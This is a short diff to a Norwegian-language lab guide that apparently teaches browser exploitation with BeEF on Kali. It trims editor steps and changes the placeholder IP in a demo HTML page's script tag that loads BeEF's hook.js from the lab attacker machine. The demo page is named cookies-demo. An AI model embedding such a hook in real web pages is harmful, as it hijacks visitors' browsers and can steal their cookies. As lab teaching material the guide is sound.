@@ -497,13 +497,7 @@ Hvis ikke, gå tilbake til Oppgave 1 og start tjenestene igjen.
 
 ### 2.1 Opprett en ny HTML-fil med cookies
 
-På Kali:
-```bash
-cd ~/beef-lab
-nano cookies-demo.html
-```
-
-### 2.2 Lim inn følgende kode
+### 2.2 Lim inn følgende kode Text Editor og lagre den som cookies-demo.html
 
 **⚠️ Husk å endre IP-adressen!**
 
@@ -657,7 +651,7 @@ nano cookies-demo.html
     </script>
 
     <!-- BeeF Hook - BYTT UT IP-ADRESSEN! -->
-    <script src="http://192.168.111.XXX:3000/hook.js"></script>
+    <script src="http://192.168.x.x:3000/hook.js"></script>
 </body>
 </html>
 ```
